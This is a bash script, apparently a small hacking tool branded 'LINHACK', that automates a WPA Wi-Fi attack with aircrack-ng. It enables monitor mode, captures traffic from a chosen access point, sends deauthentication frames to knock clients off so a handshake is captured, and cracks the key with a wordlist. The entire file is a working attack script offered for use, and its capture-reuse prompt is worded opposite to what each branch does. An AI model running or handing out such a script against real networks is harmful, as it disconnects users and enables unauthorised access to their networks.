#!/bin/bash
printf "\n"
echo "██╗░░░░░██╗███╗░░██╗██╗░░██╗░█████╗░░█████╗░██╗░░██╗"
echo "██║░░░░░██║████╗░██║██║░░██║██╔══██╗██╔══██╗██║░██╔╝"
echo "██║░░░░░██║██╔██╗██║███████║███████║██║░░╚═╝█████═╝░"
echo "██║░░░░░██║██║╚████║██╔══██║██╔══██║██║░░██╗██╔═██╗░"
echo "███████╗██║██║░╚███║██║░░██║██║░░██║╚█████╔╝██║░╚██╗"
echo "╚══════╝╚═╝╚═╝░░╚══╝╚═╝░░╚═╝╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝"
printf "\n"
printf "***************************************************"
printf "\n\n"
sudo apt-get install aircrack-ng
sudo apt-get install gnome-terminal
printf "\n"
echo Started on `date`
printf "\n"
ifconfig
monitor='mon'
temp='-01.cap'
read -p "Enter the interface:" interface
printf "\n"
nmcli dev wifi
airmon-ng start ${interface}
airmon-ng check kill
trap 'sudo systemctl start NetworkManager && airmon-ng stop ${interface}${monitor} && sudo killall aircrack-ng && exit' 1 2 3 9 SIGTERM
printf "\n\n"
read -p "Enter the bssid:" bssid
printf "\n\n"
read -p "Enter the channel:" channel
printf "\n\n"
read -p "Enter the location where you want to save the capture file:" store
timeout 15s airodump-ng --bssid ${bssid} -c  ${channel} -w ${store} ${interface}${monitor} &
gnome-terminal --command="bash -c 'aireplay-ng -0 15 -a ${bssid} ${interface}${monitor}'"
wait
printf "\n\n"
read -p "Do you want to use previously captured file? (y for yes / n for no):" capture
if [ $capture == 'y' ]
then
	printf "\n\n"
	read -p "Enter the location of the wordlist file:" wordlist
	aircrack-ng ${store}${temp} -w ${wordlist}
	sudo systemctl start NetworkManager && airmon-ng stop ${interface}${monitor} && exit
elif [ $capture == 'n' ]
then
	printf "\n\n"
	read -p "Enter the location of the captured file:" location
	printf "\n\n"
	read -p "Enter the location of the wordlist file:" wordlist
	printf "\n\n"
	aircrack-ng ${location} -w ${wordlist}
	sudo systemctl start NetworkManager && airmon-ng stop ${interface}${monitor} && exit
else
	echo "Invalid option"
	sudo systemctl start NetworkManager && airmon-ng stop ${interface}${monitor} && exit
fi
printf "\n\n"
echo Finished on `date`
